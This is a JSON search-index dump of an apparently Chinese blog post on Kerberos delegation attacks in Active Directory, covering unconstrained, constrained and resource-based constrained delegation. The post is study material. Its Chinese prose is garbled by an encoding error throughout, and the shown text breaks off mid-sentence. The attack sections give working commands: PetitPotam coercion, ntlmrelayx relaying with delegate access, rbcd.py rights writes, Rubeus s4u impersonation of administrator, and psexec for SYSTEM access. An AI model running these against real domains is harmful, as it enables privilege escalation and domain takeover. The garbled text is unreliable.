[{"categories":["ADåŸŸ"],"content":"æœ¬æ–‡è®°å½•å­¦ä¹ Kerberosè®¤è¯å’Œå§”æ´¾ç›¸å…³çš„çŸ¥è¯†å’Œæ”»å‡»æ‰‹æ³•ï¼Œç”±äºåŸç†å¾ˆå¤æ‚ï¼Œæ‰€ä»¥ä¸æ•¢ä¿è¯è‡ªå·±èƒ½è®²æ˜ç™½ã€‚å°½åŠ›ğŸ˜¥ã€‚ æ³¨ï¼š æœ¬æ–‡ä¸­ TGS = æœåŠ¡ç¥¨æ®ST ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:0:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"Kerberos ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"ç®€ä»‹ Kerberosæ˜¯ä¸€ç§ç”±MITï¼ˆéº»çœç†å·¥å¤§å­¦ï¼‰æå‡ºçš„ä¸€ç§ç½‘ç»œèº«ä»½éªŒè¯åè®®ã€‚å®ƒæ—¨åœ¨é€šè¿‡ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸ºå®¢æˆ·ç«¯/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºèº«ä»½éªŒè¯ã€‚ åœ¨Kerberosåè®®ä¸­ä¸»è¦æ˜¯æœ‰ä¸‰ä¸ªè§’è‰²çš„å­˜åœ¨ï¼š æä¾›æœåŠ¡çš„Server(å¦‚HTTPæœåŠ¡ï¼ŒMSSQLæœåŠ¡ç­‰) KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œé»˜è®¤å®‰è£…åœ¨åŸŸæ§ï¼ˆDomain Controllerï¼‰ä¸­ã€‚KDCåŒ…å«ä¸‹é¢ä¸‰ä¸ªè§’è‰² Authentication Service: ä¸ºclientç”ŸæˆTGTçš„æœåŠ¡ Ticket Granting Service: ä¸ºclientç”ŸæˆæŸä¸ªæœåŠ¡çš„TGSï¼ˆticketï¼‰ Account Database:ä¸€ä¸ªç±»ä¼¼äºæœ¬æœºSAMçš„ä¸€ä¸ªæ•°æ®åº“ã€‚å­˜å‚¨æ‰€æœ‰clientçš„ç™½åå•ï¼Œåªæœ‰å­˜åœ¨äºç™½åå•çš„clientæ‰èƒ½é¡ºåˆ©ç”³è¯·åˆ°TGTã€‚ PAC (Privileged Attribute Certificate) ç‰¹æƒå±æ€§è¯ä¹¦ä¿æŠ¤ åŠŸèƒ½ï¼ŒPACä¸»è¦æ˜¯è§„å®šæœåŠ¡å™¨å°†ç¥¨æ®å‘é€ç»™kerberosæœåŠ¡ï¼Œç”± kerberosæœåŠ¡éªŒè¯ç¥¨æ®æ˜¯å¦æœ‰æ•ˆã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"è®¤è¯æµç¨‹ å‚è€ƒè‡ªdaikerã€å€¾æ—‹ã€ JD.Army AS_REQ: Clientå‘KDCå‘èµ·AS_REQ,è¯·æ±‚å‡­æ®åŒ…å«ç”¨æˆ·åï¼Œç”¨æˆ·çš„NTLM HashåŠ å¯†çš„æ—¶é—´æˆ³ï¼Œåˆ°æœŸæ—¶é—´ç­‰ä¿¡æ¯ã€‚ AS_REP: KDCæ ¹æ®ç”¨æˆ·ååœ¨Accout Databaseä¸­æŸ¥æ‰¾ç”¨æˆ·å¯¹åº”çš„NTLM Hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®åˆ™ç¬¬ä¸€æ­¥è®¤è¯é€šè¿‡ã€‚éšåKDCç”Ÿæˆéšæœºå­—ç¬¦ä¸²Session Keyï¼Œä½¿ç”¨ç”¨æˆ·NTLM HashåŠ å¯†Session Keyä½œä¸ºAS_REPè¿”å›ï¼ŒåŒæ—¶è¿”å›ç”¨krbtgt hashåŠ å¯†çš„TGTç¥¨æ®ï¼ŒTGTé‡Œé¢åŒ…å«PAC,PACåŒ…å«Clientçš„sidï¼ŒClientæ‰€åœ¨çš„ç»„ä»¥åŠSession Keyã€‚ TGS_REQ: Clientå‡­å€ŸTGTç¥¨æ®ä¸ä½¿ç”¨è‡ªå·±NTLM Hashè§£å¯†å‡ºæ¥çš„Session KeyåŠ å¯†çš„å®¢æˆ·ç«¯ä¿¡æ¯è·Ÿæ—¶é—´æˆ³ã€‚å‘KDCå‘èµ·é’ˆå¯¹ç‰¹å®šæœåŠ¡çš„TGS_REQè¯·æ±‚ã€‚ TGS_REP: KDCä½¿ç”¨krbtgt hashå¯¹TGTè¿›è¡Œè§£å¯†å¾—åˆ°Session Keyï¼Œå†ä½¿ç”¨Session Keyè§£å¯†å…¶ä»–å†…å®¹ï¼Œè§£å¯†å‡ºæ¥çš„å†…å®¹åŒTGTä¸­çš„ä¿¡æ¯è¿›è¡Œæ ¡éªŒæ¥ç¡®è®¤å®¢æˆ·ç«¯æ˜¯å¦å—ä¿¡ï¼Œå¦‚æœç»“æœæ­£ç¡®ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„Session Keyï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºServer Session Keyï¼Œè¿™ä¸ªServer Session Keyä¸»è¦ç”¨äºå’ŒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚è¿”å›ä¿¡æ¯åŒ…æ‹¬Session KeyåŠ å¯†çš„Server Session Keyå’Œç”¨Server HashåŠ å¯†PACã€Server Session Keyå’Œå®¢æˆ·ç«¯ä¿¡æ¯çš„STç¥¨æ®ï¼ˆticketï¼‰(è¿™ä¸€æ­¥ä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±è¿”å›STç¥¨æ®) AP_REQ: Clientæ‹¿ç€STç¥¨æ®ï¼ˆåŒ…å«PACï¼‰å’ŒServer Session KeyåŠ å¯†çš„å®¢æˆ·ç«¯ä¿¡æ¯ä¸æ—¶é—´æˆ³å»è¯·æ±‚æœåŠ¡ã€‚ AP_REP: æœåŠ¡ä½¿ç”¨è‡ªå·±çš„hashè§£å¯†STç¥¨æ®ã€‚å¦‚æœè§£å¯†æ­£ç¡®ï¼Œå°±æ‹¿ç€PACå»KDCé‚£è¾¹é—®Clientæœ‰æ²¡æœ‰è®¿é—®æƒé™ï¼ŒåŸŸæ§è§£å¯†PACã€‚è·å–Clientçš„sidï¼Œä»¥åŠæ‰€åœ¨çš„ç»„ï¼Œå†æ ¹æ®è¯¥æœåŠ¡çš„ACLï¼Œåˆ¤æ–­Clientæ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"å›¾è§£ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:1:3","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"S4Uæ‰©å±•åè®® åŒ…æ‹¬s4u2selfå’Œs4u2proxyã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"s4u2self ä»–å…¶å®æ˜¯ä¸€æ¬¡TGSè®¤è¯çš„é˜¶æ®µã€‚æœåŠ¡Aä»£æ›¿ç”¨æˆ·è¯·æ±‚ä¸€å¼ é’ˆå¯¹æœåŠ¡Aæœ¬èº«çš„æœåŠ¡ç¥¨æ®STã€‚ç”Ÿæˆçš„æœåŠ¡ç¥¨æ®ä¸€èˆ¬æ˜¯ç”¨äºåé¢çš„s4u2proxyè®¤è¯é˜¶æ®µã€‚ ä¹‹æ‰€ä»¥æœ‰è¿™ä¸ªé˜¶æ®µï¼Œæ˜¯ä¸ºäº†å…¼å®¹å…¶ä»–ä¸é€šè¿‡Kerberosè®¤è¯çš„ç™»å½•æ–¹å¼ï¼Œæ¯”å¦‚ç”¨æˆ·é€šè¿‡SSOç»Ÿä¸€ç™»å½•ã€æˆ–è€…é€šè¿‡NTLMè®¤è¯ã€‚è¿™æ˜¯ä¸€ä¸ªåè®®è½¬æ¢çš„è¿‡ç¨‹ã€‚ æœåŠ¡ä»£è¡¨ç”¨æˆ·è·å¾—é’ˆå¯¹æœåŠ¡è‡ªèº«çš„kerberosç¥¨æ®è¿™ä¸ªè¿‡ç¨‹ï¼ŒæœåŠ¡æ˜¯ä¸éœ€è¦ç”¨æˆ·çš„å‡­æ®çš„ã€‚ è·å–å¯è½¬å‘ç¥¨æ®çš„å‰æï¼š æœºå™¨è¢«é…ç½®äº†çº¦æŸæ€§å§”æ´¾ ç”¨æˆ·æ²¡æœ‰è®¾ç½® æ•æ„Ÿè´¦æˆ·ï¼Œä¸èƒ½è¢«å§”æ´¾ ç”¨æˆ·ä¸æ˜¯å—ä¿æŠ¤ç”¨æˆ·ç»„çš„æˆå‘˜ å³ä½¿æœºå™¨æ²¡æœ‰è¢«é…ç½®çº¦æŸå§”æ´¾ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·çš„UserAccountControlä½æ²¡æœ‰TrustedToAuthForDelegation å±æ€§ã€‚ s4u2selfä¾ç„¶å¯ä»¥è¯·æ±‚åˆ°æœåŠ¡ç¥¨æ®ï¼Œåªä¸è¿‡è¿™ä¸ªæœåŠ¡ç¥¨æ®ä¸å¯è½¬å‘ã€‚è¿™ç§æƒ…å†µé€‚ç”¨äºåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾RBCDã€‚ è¢«å§”æ´¾çš„ç”¨æˆ·é…ç½®äº†æ•æ„Ÿç”¨æˆ·ä¸èƒ½è¢«å§”æ´¾ï¼Œs4u2selfè¿”å›ä¸å¯è½¬å‘ç¥¨æ®ã€‚ä¸å¯ç”¨äºs4u2proxyï¼ˆCVE-2020-17049ç»•è¿‡ï¼‰ï¼Œä½†å¯ç”¨äºs4u2selfææƒã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"s4u2proxy æœåŠ¡Aæ‹¿ç€s4u2selfé˜¶æ®µè¯·æ±‚çš„æœåŠ¡ç¥¨æ®STå»è¯·æ±‚å¦ä¸€ä¸ªæœåŠ¡Bçš„æœåŠ¡ç¥¨æ®ã€‚ S4U2Proxy æ€»æ˜¯äº§ç”Ÿä¸€ä¸ªå¯è½¬å‘çš„ TGSï¼Œå³ä½¿è¯·æ±‚ä¸­æä¾›çš„é¢å¤– TGS æ˜¯ä¸å¯è½¬å‘çš„ã€‚ https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html æœ‰ä¸ªç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‰é¢åœ¨S4U2SELFé‡Œé¢æåˆ°ï¼Œåœ¨æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ä¹‹åï¼ŒS4U2SELFè¿”å›çš„ç¥¨æ®æ˜¯å¯ä»¥è½¬å‘çš„ï¼Œè¿™ä¸ªç¥¨æ®ä½œä¸ºS4U2PROXYçš„AddtionTicketï¼Œæœ‰äº›æ–‡ç« é‡Œé¢ä¼šè¯´ï¼ŒS4U2PROXYè¦æ±‚AddtionTicketé‡Œé¢çš„ç¥¨æ®ä¸€å®šè¦æ˜¯å¯è½¬å‘çš„ï¼Œå¦åˆ™S4U2PROXYç”Ÿæˆçš„ç¥¨æ®æ˜¯ä¸å¯ä»¥è½¬å‘çš„ã€‚è¿™ä¸ªè¯´æ³•åœ¨å¼•å…¥å¯èµ„æºçº¦æŸå§”æ´¾çš„æƒ…å†µä¸‹ï¼Œæ˜¯ä¸æˆç«‹çš„ã€‚ï¼ˆTGS_REQ \u0026 TGS_REP - windows protocolï¼‰ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:2:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"éçº¦æŸå§”æ´¾ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"ä»‹ç» Windows 2000å¼•è¿›éçº¦æŸå§”æ´¾ã€‚ é…ç½®éçº¦æŸå§”æ´¾éœ€è¦SeEnableDelegationæƒé™ã€‚è¿™ä¸ªæƒé™é€šå¸¸åªæˆäºˆåŸŸç®¡ç†å‘˜ã€‚ è¢«é…ç½®äº†éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨ã€‚å…¶ä»–ç”¨æˆ·ï¼ˆæ¯”å¦‚è¯´åŸŸç®¡ï¼‰è®¿é—®è¿™å°æœºå™¨æ—¶ï¼Œä¼šæºå¸¦è¯¥ç”¨æˆ·çš„TGTã€‚å¹¶å°†TGTç¼“å­˜è¿›éçº¦æŸå§”æ´¾æœºå™¨lsasså†…å­˜ä¸­ã€‚å¦‚ä¸‹å›¾ï¼Œ æ­£å¸¸æœªè¢«é…ç½®å§”æ´¾çš„æœºå™¨lsasså†…å­˜ä¸­åªæœ‰æœåŠ¡ç¥¨æ®STã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"åˆ©ç”¨ é…ç½®äº†éçº¦æŸå§”æ´¾çš„ç”¨æˆ·çš„userAccountControlå±æ€§æœ‰ä¸ªFLAGä½TrustedForDelegationã€‚ æŸ¥è¯¢éçº¦æŸå§”æ´¾ç”¨æˆ· AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName æŸ¥è¯¢éçº¦æŸå§”æ´¾æœºå™¨ AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName ç”±äºç”¨æˆ·è®¿é—®éçº¦æŸå§”æ´¾ä¸»æœºä¼šè‡ªåŠ¨ç•™ä¸‹è‡ªå·±çš„TGTï¼Œæ‰€ä»¥åˆ©ç”¨æ€è·¯ä¸€èˆ¬æ˜¯ï¼š è¯±å¯¼åŸŸç®¡è®¿é—®è¯¥ä¸»æœºã€‚ä»è€Œè·å–åŸŸç®¡TGTã€‚ ç»“åˆæ‰“å°æœºbugæˆ–è€…Petitpotamå¼ºåˆ¶åŸŸå†…æœºå™¨è®¿é—®è¯¥ä¸»æœºã€‚ ç¬¬äºŒç§æ–¹æ³•æœ‰ä¸€ä¸ªç»å…¸æ”»å‡»åœºæ™¯ï¼šè·¨åŸŸ å› ä¸ºåŸŸæ§é»˜è®¤æ˜¯éçº¦æŸå§”æ´¾ã€‚ä¸”çˆ¶åŸŸå’Œå­åŸŸä¹‹é—´é»˜è®¤æ˜¯åŒå‘ä¿¡ä»»å…³ç³»ã€‚æ‰€ä»¥å½“æˆ‘ä»¬æ‹¿ä¸‹ä¸€å°å­åŸŸæ§åã€‚å¯ä»¥é€šè¿‡PetitPotamå¼ºåˆ¶çˆ¶åŸŸæ§è®¿é—®å­åŸŸæ§ä»è€Œè·å¾—çˆ¶åŸŸæ§æœºå™¨è´¦æˆ·TGTã€‚ç„¶åè¿›è¡Œdcsyncçˆ¶åŸŸã€‚ éœ€è¦æ³¨æ„ä¸€ä¸ªç»†èŠ‚çš„æ˜¯ä½¿ç”¨æ‰“å°æœºbugæˆ–è€…Petitpotamæ—¶è¦ä½¿ç”¨hostä¸è¦ç”¨ipã€‚å¦åˆ™ä¼šå¤±è´¥ã€‚ Rubeusç›‘å¬ .\\Rubeus.exe monitor /interval:1 /filteruser:DC01$ python3 PetitPotam.py WEB2 10.10.10.10 PTTç„¶ådcsync ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:3:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"çº¦æŸæ€§å§”æ´¾ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"ä»‹ç» Windows 2003å¼•å…¥äº†çº¦æŸæ€§å§”æ´¾ é…ç½®çº¦æŸæ€§å§”æ´¾ä¹Ÿéœ€è¦SeEnableDelegationæƒé™ã€‚ å…·ä½“è¿‡ç¨‹æ˜¯æ”¶åˆ°ç”¨æˆ·çš„è¯·æ±‚ä¹‹åï¼Œé¦–å…ˆä»£è¡¨ç”¨æˆ·è·å¾—é’ˆå¯¹æœåŠ¡è‡ªèº«çš„å¯è½¬å‘çš„kerberosæœåŠ¡ç¥¨æ®(S4U2SELF)ï¼Œæ‹¿ç€è¿™ä¸ªç¥¨æ®å‘KDCè¯·æ±‚è®¿é—®ç‰¹å®šæœåŠ¡çš„å¯è½¬å‘çš„TGS(S4U2PROXY)ï¼Œå¹¶ä¸”ä»£è¡¨ç”¨æˆ·è®¿é—®ç‰¹å®šæœåŠ¡ï¼Œè€Œä¸”åªèƒ½è®¿é—®è¯¥ç‰¹å®šæœåŠ¡ã€‚ ç›¸è¾ƒäºéçº¦æŸå§”æ´¾ï¼Œçº¦æŸå§”æ´¾æœ€å¤§çš„åŒºåˆ«ä¹Ÿå°±æ˜¯é…ç½®çš„æ—¶å€™é€‰æ‹©æŸä¸ªç‰¹å®šçš„æœåŠ¡ï¼Œè€Œä¸æ˜¯æ‰€æœ‰æœåŠ¡ã€‚ å‚ç…§ä¸‹å›¾ï¼ŒserviceAåœ¨S4U2proxyé˜¶æ®µéœ€è¦ä¸€å¼ ç”¨æˆ·çš„TGSï¼ˆæœåŠ¡ç¥¨æ®STï¼‰ï¼Œè¿™ä¸ªTGSå¯ä»¥æ˜¯serviceAé€šè¿‡s4u2selfå¾—åˆ°ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·ç›´æ¥è®¿é—®serviceAå¾—åˆ°ã€‚ https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"åˆ©ç”¨ é…ç½®äº†çº¦æŸå§”æ´¾çš„ç”¨æˆ·çš„userAccountControlå±æ€§æœ‰ä¸ªFLAGä½TrustedToAuthForDelegationã€‚ å¹¶ä¸”è¿˜æœ‰ä¸ªmsDS-AllowedToDelegateToå±æ€§ï¼Œä»–çš„å€¼æ˜¯å…è®¸è®¿é—®çš„æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯é…ç½®çº¦æŸå§”æ´¾æˆ‘ä»¬æŒ‡å®šçš„ç‰¹å®šæœåŠ¡ã€‚ æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾ç”¨æˆ· AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto æŸ¥è¯¢çº¦æŸæ€§å§”æ´¾æœºå™¨ AdFind.exe -b \"DC=adc,DC=com\" -f \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto æ‹¿ä¸‹ä¸€ä¸ªçº¦æŸå§”æ´¾ä¸»æœºåï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¨¡æ‹Ÿä»»æ„ç”¨æˆ·è®¿é—®è¯¥ä¸»æœºå…è®¸çš„æœåŠ¡ï¼ˆmsDS-AllowedToDelegateToï¼‰ã€‚æ„Ÿè§‰è¿™éƒ¨åˆ†å’ŒRBCDæœ‰äº›é‡å¤ï¼Œä¸å†æ¼”ç¤ºã€‚é‡ç‚¹åœ¨RBCDã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:4:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"ä»‹ç» åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åˆåRBCDã€‚ é…ç½®çº¦æŸæ€§å§”æ´¾å’Œéçº¦æŸæ€§å§”æ´¾éƒ½éœ€è¦SeEnableDelegationæƒé™ã€‚è€Œè¿™ä¸ªæƒé™ä¸€èˆ¬åªæœ‰åŸŸç®¡æ‰æœ‰ã€‚ä¸ºäº†èµ‹äºˆç”¨æˆ·æ›´å¤§çš„çµæ´»æ€§ï¼Œå¾®è½¯åœ¨Windows server 2012ä¸­å¼•è¿›åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åªèƒ½åœ¨è¿è¡ŒWindows Server 2012 R2å’ŒWindows Server 2012çš„åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®ï¼Œä½†å¯ä»¥åœ¨æ··åˆæ¨¡å¼æ—ä¸­åº”ç”¨ã€‚ é…ç½®åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼Œæ— éœ€SeEnableDelegationæƒé™ï¼Œåªéœ€è¦å¯¹æœºå™¨å…·æœ‰å†™å±æ€§æƒé™ï¼ˆWritePropertyï¼‰ã€‚å³å¯é…ç½®ã€‚ msDS-AllowedToDelegateTo å˜æˆäº† msDS-AllowedToActOnBehalfOfOtherIdentityã€‚ä½†æ˜¯æ–¹å‘ç›¸åã€‚å‚ç…§ä¸‹å›¾ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒserviceBä¸Šé…ç½®msDS-AllowedToActOnBehalfOfOtherIdentityçš„å€¼ä¸ºserviceAã€‚é‚£ä¹ˆserviceBå°±ä¿¡ä»»æ¥è‡ªserviceAçš„å§”æ´¾ã€‚ä¹Ÿå°±æ˜¯ä¸‹å›¾çš„ä¼ å‡ºä¿¡ä»»ä¸ä¼ å…¥ä¿¡ä»»ã€‚ https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html æœåŠ¡Aä»£è¡¨ç”¨æˆ·ç”³è¯·ä¸€ä¸ªè·å¾—é’ˆå¯¹æœåŠ¡Aè‡ªèº«çš„kerberosæœåŠ¡ç¥¨æ®ã€è¿™ä¸€æ­¥å°±æ˜¯S4U2SELFï¼Œè¿™ä¸€æ­¥å°±åŒºåˆ«ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ï¼Œåœ¨S4U2SELFé‡Œé¢æåˆ°ï¼Œè¿”å›çš„TGSå¯è½¬å‘çš„ä¸€ä¸ªæ¡ä»¶æ˜¯æœåŠ¡Aé…ç½®äº†ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ï¼Œkdcä¼šæ£€æŸ¥æœåŠ¡A çš„TrustedToAuthForDelegationä½å’ŒmsDS-AllowedToDelegateTo è¿™ä¸ªå­—æ®µï¼Œç”±äºåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œæ˜¯åœ¨æœåŠ¡Bé…ç½®ï¼ŒæœåŠ¡Bçš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§é…ç½®äº†æœåŠ¡Açš„sidï¼ŒæœåŠ¡Aå¹¶æ²¡æœ‰é…ç½®TrustedToAuthForDelegationä½å’ŒmsDS-AllowedToDelegateTo å­—æ®µã€‚å› æ­¤è¿™ä¸€æ­¥è¿”å›çš„TGSç¥¨æ®æ˜¯ä¸å¯è½¬å‘çš„ã€‚ ï¼ˆTGS_REQ \u0026 TGS_REP - windows protocolï¼‰ ä¹Ÿå°±æ˜¯è¯´ä¼ ç»Ÿçš„çº¦æŸæ€§å§”æ´¾åœ¨s4u2proxyé˜¶æ®µéœ€è¦å¯è½¬å‘çš„TGSã€‚ä½†æ˜¯RBCDçš„ä¸éœ€è¦ã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:1","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"å¸¸è§„åˆ©ç”¨ Relay è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¯†ç éšæœºã€‚éœ€è¦ldapsã€‚ python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access -smb2support æŒ‡å®šæœºå™¨è´¦æˆ· python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' export KRB5CCNAME=administrator.ccache python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com' è®¡ç®—hash .\\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:\"iJ'vp3V\u003e'4De}tf\" è¯·æ±‚st .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt åŠ åŸŸè´¦æˆ· å½“ä¸€ä¸ªç”¨æˆ·ç»™ä¸€å°æœºå™¨åŠ åŸŸåï¼Œè¯¥ç”¨æˆ·å°±å¯¹è¯¥æœºå™¨å…·æœ‰å†™å±æ€§æƒé™ï¼ˆWritePropertyï¼‰ã€‚è€Œä¼ä¸šä¸­å¾€å¾€éƒ½ä¼šæœ‰ä¸€ä¸ªä¸“é—¨çš„åŠ åŸŸç”¨æˆ·ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°äº†è¿™ä¸ªåŠ åŸŸç”¨æˆ·çš„å‡­æ®åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡RBCDæ§åˆ¶ç”±è¯¥ç”¨æˆ·åŠ å…¥åŸŸå†…æ‰€æœ‰æœºå™¨çš„æƒé™ã€‚ é¦–å…ˆå‡è®¾æˆ‘ä»¬æŠ“åˆ°äº†åŠ åŸŸè´¦æˆ·ï¼ˆjoinï¼‰çš„å“ˆå¸Œæˆ–å¯†ç ã€‚ python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' å¯¼å…¥ç¥¨æ®åä½¿ç”¨psexecç­‰å·¥å…·å³å¯è·å¾—è¯¥æœºå™¨çš„SYSTEMæƒé™ã€‚è¿™ä¹Ÿæ˜¯ä¸€ç§ææƒçš„è¿‡ç¨‹ã€‚ï¼ˆjoinè´¦æˆ· -\u003e SYSTEMï¼‰ã€‚ åŒæ ·ï¼ŒåŸŸå†…Accout Operators ç»„çš„æˆå‘˜å¯¹åŸŸå†…æœºå™¨æœ‰å†™å±æ€§æƒé™ã€‚å‡è®¾æˆ‘ä»¬æ‹¿åˆ°çš„æœºå™¨ç™»å½•çš„ç”¨æˆ·æ˜¯Accout Operators ç»„çš„æˆå‘˜ã€‚åŒæ ·å¯ä»¥é€šè¿‡RBCDçš„æ–¹å¼æ‹¿åˆ°è¯¥æœºå™¨çš„SYSTEMæƒé™ã€‚ RBCDææƒæ–¹å¼æœ‰å¾ˆå¤šï¼Œä¸‹ç¯‡æ–‡ç« ä¸“é—¨è®²è§£ã€‚ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:5:2","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"å…¶ä»–æ”»å‡»é¢ ","date":"2022-02-20","objectID":"https://songzhiv.github.io/delegation/:6:0","tags":null,"title":"Delegation","uri":"https://songzhiv.github.io/delegation/"},{"categories":["ADåŸŸ"],"content":"å˜ç§é»„é‡‘ç¥¨æ® è¿™é‡Œä¹Ÿå¾ˆå¥½ç†è§£ã€‚æˆ‘ä»¬é€šè¿‡s4u2selfä»£è¡¨åŸŸç®¡administratorç”³è¯·ä¸€å¼ è®¿é—®è‡ªèº«çš„æœåŠ¡ç¥¨æ®TGSã€‚å†æ‹¿ç€è¿™å¼ 